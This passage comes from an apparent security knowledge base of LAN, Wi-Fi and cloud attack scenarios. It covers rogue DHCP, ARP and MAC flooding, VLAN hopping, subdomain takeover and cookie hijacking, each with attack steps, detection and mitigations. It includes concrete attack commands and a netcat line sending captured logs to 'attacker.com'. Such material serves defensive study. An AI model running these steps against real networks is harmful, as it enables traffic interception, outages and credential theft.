Solution: Use SIP over TLS (port 5061); enforce SRTP; use endpoint authentication
Tags: VoIP MITM, SIP Spoof, ARP Poisoning

Title: IoT Hijacking via DHCP
Attack Type: IoT Control Takeover via Rogue Gateway/DNS
Scenario Description: Attacker injects rogue DHCP responses to IoT devices, assigning malicious DNS or gateway to silently hijack control and route data externally.
Attack Steps: Step 1: Attacker connects to Wi-Fi or LAN with IoT devices (e.g., IP camera, thermostat).Step 2: Runs dnsmasq as rogue DHCP to offer leases with attacker's IP as gateway or DNS.Step 3: IoT devices (which often lack validation) accept and start using attacker's machine for routing.Step 4: Attacker forwards traffic normally but logs or intercepts sensitive data (e.g., camera streams, motion logs, thermostat schedules).Step 5: Optionally, attacker injects commands to control devices (e.g., turn off camera, unlock door).Step 6: Some IoT firmware may allow OTA updates via HTTP → attacker serves fake firmware.Step 7: Detection is hard; involves traffic analysis or inspecting IoT gateway routes manually.Step 8: Defend by isolating IoT devices into separate VLANs, disabling auto-DHCP if possible.Step 9: Use secure DNS and static routing where supported.Step 10: Monitor outgoing IoT traffic to unknown IPs or unusual volumes (use ntopng, iot-inspector).
Impact: IoT compromise, data exfiltration, device control
Detection Method: Monitor network for rogue DHCP; analyze gateway IPs and DNS logs
Solution: Enforce VLANs for IoT; bind static IPs to MACs; restrict outbound destinations
Tags: IoT Hijack, Smart Home Exploit, Rogue DHCP

Title: Captive Portal Bypass
Scenario Description: Attacker bypasses Wi-Fi captive portals (e.g., in hotels, cafes) using spoofed MACs, tunneling, or cached sessions to get free internet.
Attack Steps: Step 1: Attacker scans the Wi-Fi network and connects to a captive portal (SSID with no internet until login).Step 2: Opens browser and is redirected to a login/paywall page (e.g., hotel login).Step 3: Attacker identifies a device that already has access (e.g., staff tablet).Step 4: Uses nmap -sn to find its MAC address, then spoofs own MAC using macchanger --mac [target-MAC] wlan0.Step 5: Reconnects to Wi-Fi using the spoofed MAC → gets internet without logging in.Step 6: Alternatively, captures session cookie or token via ARP spoof and reuses in captive portal.Step 7: For encrypted portals, attacker may try DNS tunneling (e.g., iodine, dnscat2) to bypass.Step 8: Detection includes multiple devices with same MAC, unusual DNS patterns, or duplicate session logins.Step 9: Defend with MAC binding, session fingerprinting, and TLS captive portals.Step 10: Monitor duplicate MACs, use per-device tokens and enforce expiry timers.
Vulnerability: Captive portal trusts MAC address or token
Impact: Free access, usage abuse, session hijacking
Detection Method: Detect MAC duplicates; log-in anomaly detection; analyze DNS tunnel signatures
Solution: Bind MAC to session, enforce auth timeout, use TLS captive portal
Tags: Captive Bypass, MAC Spoof, Public Wi-Fi Abuse

Title: Lateral Movement & Scanning via Rogue IP/Gateway
Scenario Description: Attacker assigns themselves a rogue gateway IP and uses it to silently scan internal IP space without triggering standard logging or network visibility.
Attack Steps: Step 1: Attacker connects to internal LAN or Wi-Fi network.Step 2: Configures their interface with a static IP and a default gateway that blends with the network (e.g., ifconfig eth0 192.168.1.254 netmask 255.255.255.0 && route add default gw 192.168.1.1).Step 3: Avoids DHCP to stay hidden from lease logs.Step 4: Uses nmap -sP 192.168.1.0/24 or netdiscover to map alive hosts.Step 5: Performs stealth TCP/UDP scanning with nmap -sS -T2 -Pn 192.168.1.0/24 to detect open ports and services silently.Step 6: Logs results and identifies exploitable internal services (e.g., SMB, RDP, internal panels).Step 7: May pivot to further hosts using credentials or exploits discovered.Step 8: Detection is difficult unless internal traffic monitoring is in place.Step 9: Defend with VLAN segmentation, egress filtering, and ARP anomaly monitoring.Step 10: Monitor for unexplained static IPs and unauthorized host activity.
Vulnerability: Lack of internal IP address validation
Impact: Data mapping, credential collection, lateral pivot
Detection Method: Monitor ARP anomalies; scan logs for stealth Nmap traffic
Solution: Use static IP whitelist; apply internal segmentation and IP spoof protection
Tags: Rogue IP, Internal Scanning, Lateral Movement

Title: Data Exfiltration via Proxy/Gateway Hijack
Scenario Description: Attacker assigns themselves as default gateway to become the middleman, exfiltrating internal data to an external host while relaying traffic to avoid detection.
Attack Steps: Step 1: Attacker connects to internal LAN or Wi-Fi.Step 2: Runs rogue DHCP server or manually sets their IP as the gateway for target machines (e.g., using dnsmasq).Step 3: Victim machines start routing all traffic through attacker.Step 4: Attacker uses iptables or Bettercap to silently forward packets (iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE && echo 1 > /proc/sys/net/ipv4/ip_forward).Step 5: Attacker sniffs traffic using tcpdump or mitmproxy and extracts sensitive data.Step 6: Uses a tool like netcat to send logs to an external server (e.g., nc attacker.com 4444 < dump.log).Step 7: Optionally modifies or injects malicious responses during transmission (e.g., fake updates, payloads).Step 8: Detection is hard unless deep inspection of traffic routes is enabled.Step 9: Defend by blocking outbound traffic from unauthorized gateways.Step 10: Use static gateway binding and monitor traffic routing paths with tools like Zeek or Suricata.
Impact: Credential theft, data loss, MITM interception
Detection Method: Track abnormal gateway usage; detect internal-to-external routing anomalies
Solution: Block rogue gateways using ACLs; use DHCP snooping and static gateway enforcement
Tags: Data Theft, Proxy MITM, Gateway Hijack

Title: Mass DHCP Discover/Request Flood
Scenario Description: Attacker rapidly floods the DHCP server with fake Discover and Request packets using spoofed MACs to exhaust the lease pool and disrupt connectivity.
Attack Steps: Step 1: Attacker connects to internal network and runs DHCP starvation tool (e.g., yersinia -G, dhcpstarv, or a custom Python script using Scapy).Step 2: The tool generates thousands of DHCP Discover packets, each using a unique (fake) MAC address.Step 3: DHCP server responds with Offer and leases IPs for each MAC until the pool is exhausted.Step 4: Legitimate clients now fail to obtain IPs (DoS).Step 5: Network appears unstable and users report no internet connectivity.Step 6: Attacker combines this with rogue DHCP (see next row) to become the new IP/gateway provider.Step 7: Detection involves monitoring DHCP logs for rapid or abnormal MAC requests.Step 8: Defend using DHCP Snooping, MAC binding, and rate limiting on switches.Step 9: Apply port security to limit MACs per port.Step 10: Alert on DHCP exhaustion or excessive lease attempts.
Vulnerability: Unlimited MAC acceptance by DHCP servers
Impact: Complete denial of IP to real users
Detection Method: DHCP server log inspection; lease pool exhaustion alerting
Solution: Enable DHCP snooping; enforce MAC-to-IP mapping; rate limit MACs per switch port

Title: DHCP Exhaustion + Rogue DHCP Combo
Scenario Description: After exhausting legitimate DHCP pool, attacker runs a rogue DHCP server to assign their own IPs, gateway, and DNS to all new clients (MITM setup).
Attack Steps: Step 1: Attacker performs DHCP starvation using yersinia, dhcpstarv, or Scapy script (see SEC-319).Step 2: As DHCP pool is depleted, attacker starts a rogue DHCP server using dnsmasq.Step 3: Rogue DHCP assigns IPs like 192.168.1.100+, gateway as attacker's IP, and DNS as attacker's machine.Step 4: New clients that connect post-exhaustion receive these rogue settings.Step 5: All victim traffic is routed via the attacker (MITM opportunity).Step 6: Attacker uses tcpdump or Bettercap to sniff traffic, inject payloads, or redirect connections.Step 7: DNS queries are hijacked to malicious sites or phishing portals.Step 8: Detection includes unexpected gateway/DNS settings on endpoints.Step 9: Defend using DHCP snooping, ACLs on switch ports, and monitoring unusual DHCP traffic.Step 10: Alert on rogue DHCP offers using IDS signatures.
Vulnerability: No filtering for rogue DHCP responders
Impact: MITM, full control over client DNS/routing
Detection Method: Detect rogue DHCP packets with mismatched MACs; validate IP/gateway sources
Solution: Enforce switch-level DHCP snooping; block unauthorized DHCP traffic
Tags: Rogue DHCP, Gateway MITM, DNS Hijack

Title: Captive Portal Lockout via Rogue DHCP
Attack Type: Denial + Bypass of Guest Captive Portal
Scenario Description: Attacker sets up rogue DHCP server in a guest Wi-Fi network, assigning IPs that bypass or break captive portal redirection—causing guests to lose access or get rerouted.
Attack Steps: Step 1: Attacker connects to or sets up a rogue Wi-Fi network identical to the guest network SSID (e.g., PublicWiFi).Step 2: Runs dnsmasq or Bettercap to act as rogue DHCP server.Step 3: When real guests try to connect, attacker’s DHCP responds first, assigning IP and DNS that bypass the captive portal (e.g., directs DNS to 8.8.8.8 and no captive redirect gateway).Step 4: Guests are now either locked out (no portal) or redirected to attacker-controlled landing page.Step 5: Attacker can set up phishing page or malware site on redirect IP.Step 6: No authentication or encryption means victims often fall for fake page.Step 7: Detection requires monitoring DHCP lease behavior and redirect logs.Step 8: Defend by enforcing MAC address filtering and 802.1X on guest Wi-Fi.Step 9: Use switch-level DHCP snooping.Step 10: Alert on rogue DHCP responses or duplicate SSIDs.
Vulnerability: No rogue DHCP filtering in public Wi-Fi
Impact: DoS, credential theft, captive portal bypass
Detection Method: Monitor for rogue DHCP offers; detect mismatch in expected DNS/gateway from lease events
Solution: Enable DHCP snooping; use authenticated portal entry; enforce switch-level protections
Tags: Guest Wi-Fi, Captive Portal, Rogue DHCP

Title: Cloud-Native DHCP Abuse
Attack Type: Cloud Lease Abuse via Public APIs
Scenario Description: In cloud environments like AWS, GCP, attacker or insider triggers thousands of rapid DHCP lease requests via APIs, causing log noise, disruption, or quota exhaustion.
Tools Used: aws cli, gcloud, terraform, boto3, custom scripts
Attack Steps: Step 1: Attacker gains access to a cloud project or tenant with permission to spin up instances or interfaces (via IAM, leaked keys, etc.).Step 2: Uses a script or automation tool (e.g., boto3, terraform, or gcloud compute instances create) to rapidly create and destroy hundreds of ephemeral VMs or containers.Step 3: Each new network interface generates DHCP lease requests and logs.Step 4: If left unchecked, this can flood cloud logs, overwhelm security monitoring tools, or trigger false alarms.Step 5: May lead to IP pool exhaustion in certain subnets.Step 6: May bypass billing alert thresholds if cost is low.Step 7: Detection requires correlating lease churn with instance creation.Step 8: Defend using IAM permission limits, alert on abnormal instance spin-up patterns, and subnet-level quota controls.Step 9: Review DHCP server logs in VPC flow logs.Step 10: CloudWatch/Cloud Logging should alert on rapid changes.
Vulnerability: Over-permissive API access; lease churn unmonitored
Impact: Service disruption, log overflow, resource exhaustion
Detection Method: Monitor VPC logs for burst patterns; alert on lease churn spikes
Solution: Limit IAM roles; restrict programmatic API use; enforce lease/time controls per VPC subnet
Tags: Cloud DHCP, Lease Churn, Log Flooding

Title: Wi-Fi DHCP Flood from Mobile Botnets
Attack Type: Distributed DHCP Starvation from Mobile Devices
Scenario Description: Mobile malware causes large-scale DHCP starvation by launching coordinated Discover/Request floods from infected phones in Wi-Fi networks.
Tools Used: Custom mobile botnet, Android payloads, Scapy, dhcpstarv
Attack Steps: Step 1: Attacker distributes a malicious app (e.g., trojaned flashlight or game) to hundreds of Android devices via sideloading or phishing.Step 2: Each infected device contains code to detect open Wi-Fi networks and auto-connect.Step 3: Once connected, bot triggers DHCP flood by sending thousands of Discover/Request packets using randomized MACs using raw sockets or crafted libraries.Step 4: All DHCP leases get exhausted within seconds on guest Wi-Fi or public hotspots.Step 5: New devices cannot join the network—causing denial of service.Step 6: If paired with a rogue DHCP server, attacker could redirect traffic as well.Step 7: Detection is difficult unless MAC-based patterns are analyzed.Step 8: Admin must block frequent DHCP from same source IP or rate-limit MACs per AP.Step 9: Apply firmware-level protections in routers/APs to limit DHCP floods.Step 10: Alert on rapid MAC churn from a single BSSID/client IP.
Vulnerability: Lack of DHCP rate-limiting on Wi-Fi
Impact: Network denial, hotspot takedown, rogue redirect
Detection Method: Monitor MAC churn and DHCP logs; analyze per-device request patterns
Solution: Apply DHCP request rate limits per SSID; isolate clients; block suspicious mobile behavior
Tags: Wi-Fi Flood, Mobile Botnet, DHCP Starvation

Title: Switch Port Exhaustion via Starvation
Scenario Description: Attacker floods a managed switch with fake MAC addresses via DHCP requests or ARP replies, consuming the CAM table, causing instability or dropping legit devices.
Tools Used: macof, Yersinia, Bettercap, Scapy, ARPing, Kali Linux
Attack Steps: Step 1: Attacker connects to a wired or wireless segment of a corporate LAN that is served by a managed switch (e.g., Cisco, Aruba, Netgear).Step 2: Verifies that the switch is not hardened against MAC flooding by sending several spoofed ARP replies using arpping or bettercap -iface eth0 --mac-spoof --arp.Step 3: Launches MAC flooding attack using macof from the Dsniff suite: macof -i eth0.Step 4: This generates tens of thousands of Ethernet frames with random source MACs.Step 5: The switch attempts to learn each of these MACs and adds them to the Content Addressable Memory (CAM) table.Step 6: When the table is full, the switch begins broadcasting all incoming frames to all ports, breaking Layer 2 isolation.Step 7: As a result, attacker can sniff traffic not intended for them using tcpdump or wireshark.Step 8: Also causes legitimate devices to intermittently lose connectivity as the switch struggles with resource exhaustion.Step 9: Defenders should monitor switch logs for CAM table overflow and broadcast storms.Step 10: Mitigate with port security (max MACs), dynamic ARP inspection, and disabling unused switch ports.
Detection Method: Check CAM table stats; alert on rapid MAC learning; detect Layer 2 broadcast anomalies
Solution: Enable port security (1 MAC per port); monitor MAC churn; enable BPDU guard and portfast
Tags: MAC Flood, Switch DoS, Layer 2 Exploit

Title: Internal Red Team Recon
Scenario Description: Red teamer performs passive sniffing and active scanning inside an internal network to map hosts, services, and trust relationships without triggering alarms.
Tools Used: nmap, netdiscover, arp-scan, BloodHound, CrackMapExec, tcpdump, Wireshark, ping
Attack Steps: Step 1: Red teamer connects to internal office LAN (wired or Wi-Fi) or a staging jump box inside the target environment.Step 2: Runs passive scanning tools first to avoid detection. Uses tcpdump and Wireshark to observe ARP broadcasts, DNS queries, NBNS/LLMNR traffic, and active devices.Step 3: Uses netdiscover or arp-scan to identify live hosts and their MAC/IP bindings: arp-scan --interface eth0 192.168.1.0/24.Step 4: Runs nmap -sP 192.168.1.0/24 or nmap -sS -T2 -Pn to probe for open ports/services.Step 5: Uses CrackMapExec to enumerate SMB shares and domain controllers if in a Windows AD environment.Step 6: Executes BloodHound data collection via SharpHound or PowerShell collector to map Active Directory relationships, user permissions, and lateral paths.Step 7: Compiles hostnames, OS types, running services, shared folders, and user accounts into a recon report.Step 8: Uses ping -a, nslookup, and nbtscan to gather DNS and NetBIOS data.Step 9: Avoids noisy scans unless necessary; sticks to low-and-slow techniques.Step 10: Defenders must monitor for unusual nmap, arp-scan, or SMB enumeration patterns.
Vulnerability: Lack of internal segmentation or scan detection
Impact: Complete mapping of assets, pivoting opportunities
Detection Method: Monitor internal traffic for scanning patterns; detect SMB, DNS, ARP scan behaviors
Solution: Enforce segmentation, network zoning; use internal honeypots and anomaly-based threat detection
Tags: Reconnaissance, Internal Mapping, Red Team TTPs

Title: Reclaim Deleted Heroku App
Scenario Description: A CNAME still points to a .herokudns.com domain for an app that no longer exists. Attacker creates a new Heroku app with the same subdomain name and hijacks traffic.
Attack Steps: Step 1: Use a tool like dig or crt.sh to find subdomains of a target (e.g., app.company.com).Step 2: Check DNS records: dig app.company.com CNAME.Step 3: If it points to appname.herokudns.com, open that Heroku subdomain in a browser.Step 4: If Heroku returns a “No such app” page, that means the app was deleted, but the DNS record still exists.Step 5: Create a free Heroku account and deploy a dummy app: heroku create appname (same as old one).Step 6: Once claimed, Heroku routes incoming traffic from the original subdomain to your new app.Step 7: Upload phishing page or malicious JavaScript.Step 8: Users who visit app.company.com will unknowingly reach the attacker’s Heroku app.Step 9: Defender must periodically scan DNS and remove abandoned subdomain links.Step 10: Protect by using 404 page monitoring or DNS management alerts.
Vulnerability: Dangling CNAME to deleted Heroku resource
Detection Method: Monitor for 404s on subdomains; use DNS asset management tools
Solution: Remove or update DNS entries when apps are deleted; monitor subdomain health

Title: S3 Bucket Reclaim
Attack Type: AWS Subdomain Takeover via Deleted Bucket
Scenario Description: A CNAME record points to a non-existent Amazon S3 bucket. Attacker creates a new S3 bucket with that exact name and hosts malicious content.
Tools Used: dig, AWS CLI, amass, host, crt.sh
Attack Steps: Step 1: Use dig or host to find CNAMEs pointing to .s3.amazonaws.com (e.g., static.site.com → bucketname.s3.amazonaws.com).Step 2: Attempt to access the bucket in browser or via curl: curl http://bucketname.s3.amazonaws.com.Step 3: If AWS returns “NoSuchBucket” or XML error, the bucket has been deleted, but the domain still resolves.Step 4: Create a new S3 bucket in your AWS account with the same name: aws s3 mb s3://bucketname.Step 5: Upload malicious or phishing HTML files to the bucket.Step 6: Enable public access and website hosting for the bucket.Step 7: Now, traffic to static.site.com resolves to your malicious S3 bucket.Step 8: Defender must regularly monitor DNS entries and audit S3 buckets.Step 9: Prevent by removing CNAMEs when decommissioning cloud storage.Step 10: Enforce DNS + storage monitoring policies.
Vulnerability: DNS still pointing to removed cloud bucket
Detection Method: Monitor for DNS → 404 patterns; cloud asset inventory
Solution: Delete all DNS pointing to decommissioned storage; require approval workflow for cloud DNS changes
Tags: Subdomain Takeover, AWS S3, Cloud Asset Misuse

Title: GitHub Pages Takeover
Attack Type: GitHub CNAME Misuse via Repo Deletion
Scenario Description: A CNAME record points to a GitHub Pages repo (e.g., org.github.io) that no longer exists. Attacker forks or creates repo to hijack subdomain.
Attack Steps: Step 1: Discover subdomains using tools like crt.sh, Subfinder, or amass.Step 2: Identify domains with CNAME to .github.io that show 404 or "Not Found" on browser.Step 3: Try visiting http://username.github.io or curl the target — if “404” and DNS still resolves, it's vulnerable.Step 4: Create a GitHub account, fork a repo or create a new one.Step 5: Set the custom domain in the GitHub Pages repo settings to match the old subdomain (e.g., sub.domain.com).Step 6: Push your malicious index.html page.Step 7: GitHub now hosts your content under sub.domain.com.Step 8: Defender should monitor GitHub Pages custom domain bindings.Step 9: Remove unused CNAMEs.Step 10: Consider using automation to alert on 404s for subdomains.
Vulnerability: Repo deleted but DNS record still active
Detection Method: Detect 404s + CNAME matches on GitHub.io; scan abandoned repos
Solution: Enforce CNAME cleanup in DNS after repo deprecation; GitHub org monitoring
Tags: GitHub Pages, Subdomain Hijack, Cloud Repo Abuse

Title: Azure Blob / Web App Takeover
Scenario Description: A subdomain points to a previously removed Azure Blob Storage container or App Service (e.g., *.azurewebsites.net). Attacker claims it and serves malicious content.
Tools Used: dig, az cli, Azure Portal, curl
Attack Steps: Step 1: Scan for CNAMEs pointing to Azure domains like .blob.core.windows.net or .azurewebsites.net.Step 2: Visit the subdomain or use curl to check response: curl http://app.azurewebsites.net.Step 3: If the response is 404 or “Site not found,” the Azure service has been deleted but DNS still resolves.Step 4: Attacker creates an Azure App Service or Blob container with the same name.Step 5: Deploys malicious HTML or script files.Step 6: Now, all visitors to the original subdomain are served attacker-controlled content.Step 7: Optional: use TLS via Azure for added legitimacy.Step 8: Defenders should audit Azure DNS and blob endpoints.Step 9: Clean up orphaned DNS entries after deprovisioning Azure services.Step 10: Monitor for CNAMEs resolving to missing Azure resources.
Vulnerability: CNAME resolves to non-existent Azure service
Detection Method: Scan for missing blob/app service endpoints; monitor Azure traffic to inactive services
Solution: Remove dangling CNAMEs; regularly audit DNS + Azure app resources; use custom TLS certs tied to DNS validation
Tags: Azure Blob, DNS Hijack, Subdomain Takeover

Title: Switch Table Exhaustion (MAC Flooding)
Attack Type: Layer 2 DoS via MAC Table Overload
Scenario Description: Attacker sends a flood of Ethernet frames with fake/random source MACs to exhaust the switch's CAM table, causing it to broadcast all traffic.
Attack Steps: Step 1: Attacker connects to the internal network via Ethernet or Wi-Fi where a Layer 2 switch (e.g., Cisco, HP, Netgear) is handling host connections. Step 2: Verifies connectivity and confirms that port security or 802.1x is not enforced. Step 3: Launches MAC flooding using macof (part of Dsniff tools): macof -i eth0 or macof -i wlan0. Step 4: This generates thousands of Ethernet frames per second with randomized source MAC addresses and destination IPs. Step 5: The switch's CAM (Content Addressable Memory) table, which maps MACs to ports, fills up rapidly. Step 6: Once full, the switch enters a “fail-open” mode, broadcasting all incoming frames to all ports. Step 7: Attacker uses Wireshark or tcpdump to sniff traffic from other devices connected to the same switch. Step 8: This leads to loss of confidentiality (data leak) and may cause disruption if the switch is overwhelmed. Step 9: Defender detects this via broadcast storm logs or port MAC limit violations. Step 10: Prevent via port security (MAC limits), 802.1X, and static MAC entries.
Vulnerability: Unrestricted MAC learning per switch port
Impact: Data sniffing, DoS, loss of isolation
Detection Method: Monitor switch logs for excessive MAC changes, CAM table exhaustion
Solution: Enable port security (max 1 MAC per port); configure 802.1X authentication; alert on MAC table flooding
Tags: MAC Flooding, Switch DoS, Layer 2, Recon

Title: ARP Request Flood
Scenario Description: Attacker floods the network with ARP requests per second, overwhelming hosts and network devices with processing or memory usage.
Attack Steps: Step 1: Attacker connects to a Layer 2 LAN segment with multiple hosts. Step 2: Uses a script or tool (e.g., scapy in Python) to generate thousands of ARP request packets: arping -f -c 100000 192.168.1.255. Step 3: The ARP requests are broadcast across the subnet, causing every host to process and respond. Step 4: Routers, printers, and computers begin to spend CPU cycles replying to unnecessary ARP requests. Step 5: Some devices may temporarily become unresponsive or crash if ARP buffers overflow. Step 6: This may also flood the ARP table of network switches and firewalls. Step 7: Attacker can monitor host response delay using ping or netdiscover. Step 8: This can be a smokescreen for other attacks (like ARP spoofing or LLMNR poisoning). Step 9: Defender can detect this through high ARP broadcast rates on IDS or switch monitoring. Step 10: Mitigation includes ARP rate-limiting, ARP guard, and detection of high request anomalies.
Vulnerability: No rate-limiting on ARP request processing
Impact: Host unresponsiveness, CPU load, network congestion
Detection Method: Monitor ARP traffic volume; alert on ARP request bursts; check for anomalies using Suricata or port mirroring
Solution: Enforce ARP request limits via switch; configure anomaly alerts; disable unnecessary broadcast domains

Title: Gratuitous ARP Flood
Scenario Description: Attacker sends large volumes of unsolicited ARP replies to poison ARP tables across the network with false MAC-IP bindings.
Attack Steps: Step 1: Attacker connects to internal network and selects IPs of targets (e.g., gateway, file server, or DHCP server). Step 2: Uses ettercap or bettercap to craft unsolicited ARP replies (gratuitous ARP): bettercap -iface eth0 -eval "set arp.spoof.targets 192.168.1.1,192.168.1.5; arp.spoof on". Step 3: Sends packets to all hosts claiming “I am 192.168.1.1” (or another valid IP) but with the attacker’s MAC. Step 4: Each victim overwrites their ARP table with incorrect MACs, redirecting traffic to attacker’s system. Step 5: Flood continues rapidly, poisoning multiple ARP caches at once. Step 6: Attacker can sniff credentials, inject content, or disrupt sessions. Step 7: Network performance may degrade due to repeated ARP updates. Step 8: Defender uses ARPwatch, Suricata, or Wireshark to detect multiple unsolicited ARP replies. Step 9: Prevent by using Dynamic ARP Inspection (DAI), static ARP entries, or 802.1X + NAC. Step 10: Educate users on signs of network instability or failed connections during attack.
Target Type: All LAN hosts with ARP tables
Vulnerability: ARP cache update accepts unsolicited replies
Detection Method: Use ARPwatch to log unusual MAC-IP mappings; alert on frequent unsolicited replies
Solution: Enable Dynamic ARP Inspection (DAI); define static ARP entries for critical assets; NAC enforcement
Tags: ARP Spoof, Cache Poison, Gratuitous ARP, MITM

Title: Repeated Conflict Injection
Scenario Description: Attacker repeatedly injects ARP replies causing IP conflict errors in victim machines, forcing service disruptions or DoS.
Attack Steps: Step 1: Attacker scans the local subnet to find active IPs using netdiscover, nmap -sn, or arp-scan. Step 2: Selects one or more IPs of active users or servers. Step 3: Uses scapy or arpspoof to send fake ARP replies claiming to be that IP but with a different MAC. Step 4: Victim system detects a conflicting MAC for its IP and throws a “Duplicate IP detected” warning. Step 5: Depending on OS, the victim may disconnect, pause network stack, or auto-release the IP. Step 6: Repeats this process cyclically to trigger instability for multiple users. Step 7: Can combine with DHCP starvation to maximize disruption. Step 8: Defender can detect via ARPwatch, system event logs, or network alerts on duplicate IPs. Step 9: Mitigate with IP/MAC binding, static assignments, and ARP spoof protection. Step 10: Disable auto-IP assignment on critical servers or use 802.1X/EAP-TLS for identity verification.
Vulnerability: Accepting spoofed ARP replies triggers conflict
Impact: System disconnects, DoS, IP change loops
Detection Method: Monitor system logs for duplicate IP errors; use NIDS for conflict signatures
Solution: Bind MAC to IP in DHCP; use DHCP snooping and static IPs for servers; enable DAI where possible
Tags: ARP DoS, Conflict Injection, Duplicate IP

Title: VoIP / IoT Disruption
Scenario Description: Flood lightweight, resource-constrained devices like VoIP phones, smart cameras, or sensors with ARP packets to overload or crash them.
Attack Steps: Step 1: Attacker connects to internal LAN where VoIP phones or IoT devices (e.g., IP cameras, smart bulbs) are deployed. Step 2: Uses tools like scapy or nping to craft thousands of ARP requests or Ethernet frames targeting device IPs. Example: nping --arp -c 10000 --rate 1000 -a 00:11:22:33:44:55 --dest-mac ff:ff:ff:ff:ff:ff --dest-ip 192.168.1.100. Step 3: Lightweight devices with limited memory/CPU begin to lag, drop packets, or reset. Step 4: VoIP devices start experiencing call quality drops or disconnections (jitter, delay, RTP loss). Step 5: IoT devices may go offline, fail to send telemetry, or reboot. Step 6: Attacker can time floods during high usage hours for more impact. Step 7: Defender detects through device logs, sudden drops in connectivity, or degraded QoS metrics. Step 8: Mitigate by segmenting VoIP/IoT onto separate VLANs and enabling ARP/packet rate limiting on switch ports.
Vulnerability: No traffic filtering, low processing capacity
Impact: VoIP call drops, camera outage, device reset
Detection Method: Monitor traffic from endpoints for high ARP/ICMP bursts; enable logging on VoIP devices
Solution: Segment devices with VLANs; enable QoS; limit broadcast/ARP rate per port
Tags: IoT DoS, VoIP Drop, ARP Flood, Layer 2

Title: Interrupt Stateful Firewalls or NATs
Scenario Description: ARP flooding causes confusion in NAT/firewall state tables, disrupting connection tracking and allowing bypass or session breakage.
Tools Used: macof, arpspoof, scapy, custom Python scripts
Attack Steps: Step 1: Attacker connects behind a NAT or inside a perimeter protected by a stateful firewall (e.g., pfSense, iptables, ASA). Step 2: Launches massive MAC or ARP flood using macof or scapy. Example: macof -i eth0 or write a scapy script to send thousands of spoofed ARP replies. Step 3: NAT/firewall begins receiving packets from "new" fake MACs and source IPs. Step 4: This overloads the state tracking table — the firewall or NAT can no longer properly associate connections with internal clients. Step 5: Existing connections (e.g., SSH, RDP, VoIP) get dropped, new ones can't be established. Step 6: This also enables attackers to bypass session restrictions (e.g., per-IP session limits). Step 7: In advanced cases, the attacker injects traffic to hijack sessions while state tracking is broken. Step 8: Defender must inspect firewall logs, NAT session table metrics, and monitor for overflow warnings. Step 9: Use ACLs to restrict incoming MAC/IP patterns; enable MAC learning limits and ARP inspection.
Vulnerability: No MAC/IP rate limits; poor ARP handling
Impact: Firewall failure, session drops, policy bypass
Detection Method: Review state table size, monitor for flood alerts on firewalls and NAT logs
Solution: Set state table limits; filter spoofed MACs; drop invalid ARP packets at the switch level
Tags: Firewall DoS, NAT Bypass, State Confusion, ARP Flood

Title: Prep for MITM via ARP Poisoning
Scenario Description: Combine generic ARP/MAC flooding to mask targeted ARP spoofing to perform man-in-the-middle interception undetected.
Attack Steps: Step 1: Attacker begins by sending a MAC flood using macof or a crafted scapy script, filling up switch CAM tables. Step 2: Once the switch starts broadcasting (fail-open), attacker begins targeted ARP spoofing using Bettercap or ettercap. Step 3: Tools send ARP replies claiming to be the default gateway to one or more victims. Step 4: The background flood hides the spoofing traffic from detection systems that look for isolated anomalies. Step 5: Victim now sends all their traffic to attacker, believing it to be the gateway. Step 6: Attacker captures, modifies, or relays packets (MITM) using Wireshark or tcpdump. Step 7: Can inject payloads, downgrade SSL, or steal credentials. Step 8: Defender may not detect if looking for spoofing without considering background noise. Step 9: Proper mitigation includes DAI (Dynamic ARP Inspection), port security, and MITM detection agents like Arpwatch.
Impact: MITM access, credential theft, stealthy recon
Detection Method: Use ARPwatch, MAC limit alerts, monitor duplicate MAC/IP bindings
Solution: Enable DAI, enforce port security, use VLAN ACLs to restrict L2 spoofing, deploy network IDS for ARP poisoning
Tags: MITM, Spoof, Flood, Hybrid Attack, Layer 2

Title: DoS + VLAN Hopping (if misconfigured)
Scenario Description: Exploit misconfigured VLAN tagging or trunking to send packets into unauthorized VLANs during flooding attacks.
Attack Steps: Step 1: Attacker plugs into an access port or rogue Wi-Fi connected to a switch with improperly configured VLANs. Step 2: Begins sending 802.1Q-tagged Ethernet frames using tools like yersinia or vlan-hopper. Step 3: If switch accepts VLAN-tagged packets from an access port (i.e., no filtering), these packets enter restricted VLANs. Step 4: Attacker sends crafted packets into VLANs meant for VoIP, finance, or management traffic. Step 5: At the same time, floods traffic (e.g., DHCP or ARP packets) to trigger DoS or confusion within target VLAN. Step 6: May disrupt DHCP operations, trigger firewall misrouting, or confuse VLAN-based segmentation controls. Step 7: Defender detects via switch logs showing unexpected VLAN entries from user ports or high ARP traffic from access interfaces. Step 8: Mitigate using strict VLAN tagging rules, native VLAN mismatch detection, and port ACLs.
Detection Method: Monitor switch logs for tagged traffic on access ports; audit VLAN trunking configuration
Solution: Disable trunking on access ports; configure Native VLAN filtering; use PVLANs and ACLs to isolate traffic
Tags: VLAN Hop, L2 DoS, Segmentation Bypass

Title: Hijack Web Login Session
Scenario Description: Attacker captures a valid HTTP/HTTPS session cookie, reuses it in their own browser to impersonate a logged-in user.
Tools Used: Burp Suite, Wireshark, browser dev tools, Ettercap
Attack Steps: Step 1: Victim logs into a website over HTTP or improperly configured HTTPS (e.g., mixed content, weak HTTPS settings). Step 2: Attacker performs ARP spoofing or becomes MITM using Bettercap or Ettercap. Step 3: While monitoring traffic using Wireshark or Burp Suite, attacker captures a session cookie from the victim’s HTTP headers (Cookie: sessionid=...). Step 4: Attacker opens browser → opens dev tools → visits target site. Step 5: Manually sets the stolen cookie inside dev tools → Application → Cookies → Replace with captured session. Step 6: Refreshes page → attacker is now logged in as victim. Step 7: Can now perform any user action like changing password, transferring funds, downloading data. Step 8: Defender may detect unusual IP/session reuse, but often attackers spoof User-Agent and IP to avoid this.
Vulnerability: Insecure cookie transport, no HttpOnly/Secure flag
Detection Method: Look for duplicate session IDs, IP switches, session reuse patterns
Solution: Set cookies with Secure, HttpOnly, SameSite; force HTTPS; regenerate session ID after login

Title: Intercept Auth Tokens (JWT/OAuth)
Scenario Description: Attacker intercepts or steals authentication tokens (e.g., JWT, OAuth bearer) and uses them to access APIs or protected web app resources.
Tools Used: Burp Suite, Postman, Browser Dev Tools, MITMproxy
